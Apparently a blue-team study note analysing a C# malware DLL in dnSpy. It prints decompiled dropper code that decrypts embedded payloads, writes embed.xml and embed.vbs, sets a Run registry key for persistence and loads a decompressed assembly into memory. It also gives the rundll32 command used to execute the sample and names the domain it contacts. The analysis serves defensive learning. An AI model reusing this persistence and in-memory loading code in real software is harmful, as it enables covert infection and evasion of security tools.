---
{"dg-publish":true,"permalink":"/cards/blue-team/malware-analysis/c-sharp-malware-analysis/","tags":["malware"]}
---

[[map-of-contents/malware\|malware]] 
### Introduction 
---
In a C# when performing static analysis by getting the strings - the output is usually cleaner no junk unlike C or C++ binaries.

![Pasted image 20240620200434.png|350](/img/user/cards/blue-team/malware-analysis/images/Pasted%20image%2020240620200434.png)

The **mscorlib** is a series of .NET libraries that can be imported to C# - in a compiled language such as C, C++, C# and more - the compiler translates the code into a machine code - however C# takes one more step - the **common language runtime** it is a single set of machine code for many types of languages, so every binary created using the .NET framework will go under the CLT - the **C# compiler** will create what is called **Intermediate Language**, it will acts as a broker between the compiler and the **CLR**.

![Pasted image 20240620211429.png](/img/user/cards/blue-team/malware-analysis/images/Pasted%20image%2020240620211429.png)
## dnSpy
---
It will translate the immediate language as closely to the source code as possible:

![Pasted image 20240621184359.png|450](/img/user/cards/blue-team/malware-analysis/images/Pasted%20image%2020240621184359.png)

The **EmbedDLL** is the filename when it was compiled but the name now is different.

```C#
// Line 1
byte[] array = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes("p0w3r0verwh3lm1ng!"));     
// Line 2
string text = new StreamReader(new MemoryStream(Cryptor.AES_Decrypt(Convert.FromBase64String("Very Long B64 here"), array))).ReadToEnd();

// Line 3
File.WriteAllText(Environment.GetEnvironmentVariable("public") + "\\embed.xml", text);

// Line 4
string text2 = new StreamReader(new MemoryStream(Convert.FromBase64String("B64"))).ReadToEnd();

// Line 5
File.WriteAllText("C:\\Users\\Public\\Documents\\embed.vbs", text2);
```

- `Line 1` - Hashes the string that is encoded in `UTF-8` using `SHA256` .
- `Line 2` - Decodes the Base64 uses `Line 1` value a symmetric key to decrypt the decoded base64
- `Line 3` - Creates a file in the public directory name `embed.xml` with the value from `Line 2` variable name `text`.
- `Line 4` - Decodes Base64 
- `Line 5` - Creates a VBscript name `embed.vbs` with the contents of `text2` from `Line 4` in the public document directory.

```C#
try
			{
				RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("embed", "C:\\Users\\Public\\Documents\\embed.vbs");
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.Message);
			}
```

The whole code establishes persistence by running the `embed.vbs` everytime the user logs on.
###  Running a DLL
---
Running a `.dll` is not possible as they don't have a main function like an executable file instead it contains functions called by other programs however we can use the built-in tool by Windows name `rundll32 file.dll, func_name`:

![Pasted image 20240621192723.png](/img/user/cards/blue-team/malware-analysis/images/Pasted%20image%2020240621192723.png)


```C
rundll32 Malware.cryptlib64.dll,embed
```

Looking at the directories:

![Pasted image 20240621193145.png](/img/user/cards/blue-team/malware-analysis/images/Pasted%20image%2020240621193145.png)

It opens the msbuild.exe to build the `embed.xml` and the `.xml` file contains:

![Pasted image 20240621193302.png](/img/user/cards/blue-team/malware-analysis/images/Pasted%20image%2020240621193302.png)
It decodes a base64 and invokes what is the result from it and looking at Wireshark it seems to contact this domain:

```
http://srv.masterchiefsgruntemporium.local/en-us/index.html
```

![Pasted image 20240621200458.png](/img/user/cards/blue-team/malware-analysis/images/Pasted%20image%2020240621200458.png)

At the registry editor:

![Pasted image 20240621195928.png](/img/user/cards/blue-team/malware-analysis/images/Pasted%20image%2020240621195928.png)

A deep dive to the code:

```C#
// Line 0
var oms = new System.IO.MemoryStream();

var ds = new System.IO.Compression.DeflateStream(new System.IO.MemoryStream(System.Convert.FromBase64String(('Very long'));

var by = new byte[1024];

var r = ds.Read(by, 0, 1024);

while (r > 0) { 
oms.Write(by, 0, r);

r = ds.Read(by, 0, 1024);
}
```

- `Line 1` - Decodes the Base64 encoded string
- `Line 2` - Initialize a byte variable with a size of 1024
- `Line 3` - It reads the value of `ds`  and then uses the `by` to store the decompressed data, the `0` is the offset meaning data is stored in index 0 then specifies the maximum value to read from the stream.
- `Line 4` - Writes a specified number of bytes into a _something_ - the explanation is the same for `Read` as for the parameters passed.

```C#
System.Reflection.Assembly.Load(oms.ToArray()).EntryPoint.Invoke(0, new object[] { new string[]{ } });
```

The ‘something’ is actually from `Line 0` which is a memory stream — the `oms` creates a memory stream and the `Write` function writes it into the memory stream and then is invoked.

- The `System.Reflection.Assembly.Load`  - Load everything into memory bypassing EDR and Antivirus.
- The `oms.ToArray()` value will represent the entry point of the assembly indicated by the `EntryPoint` 
- The `.Invoke` is similar to PowerShell `iex`.
### Questions and Problems
---
So what is the purpose of the malware? (Note: I did not perform basic/advanced analysis — went straight to dnSpy)

The indicators for me are these:

- It contacts the domain ‘http://srv.masterchiefsgruntemporium.local/en-us/index.html’
- It makes a POST request — see **Wireshark Image** which is more likely that the dropper is telling the server ‘Hey I successfully compromised the system’
## Conclusion
---

